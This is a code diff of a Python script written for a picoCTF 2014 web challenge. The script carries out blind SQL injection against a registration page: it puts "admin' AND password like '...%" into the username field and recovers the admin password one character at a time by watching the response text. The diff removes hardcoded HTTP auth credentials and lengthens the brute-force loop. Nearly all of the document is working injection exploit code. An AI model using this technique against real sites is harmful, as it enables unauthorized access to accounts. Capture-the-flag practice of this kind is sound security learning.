@@ -5,7 +5,7 @@ def sendpass(password):
     usernameString = "admin' AND password like '{0}%".format(password)
     payload = {'username': usernameString}
     #payload = {'username': "natas16", 'debug': True}
-    r = requests.post("http://web2014.picoctf.com/injection4/register.php", data=payload, verify=False, auth=('ecwong', 'o2754hgir'))
+    r = requests.post("http://web2014.picoctf.com/injection4/register.php", data=payload, verify=False)
     print r.text
     # return true if "user exist" text is displayed
     return "already" in r.text
@@ -14,7 +14,7 @@ charlist = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q',
 
 password = ""
 
-for i in range(25):
+for i in range(27):
     for c in charlist:
         temppass = password+c
         print "Testing: " + temppass
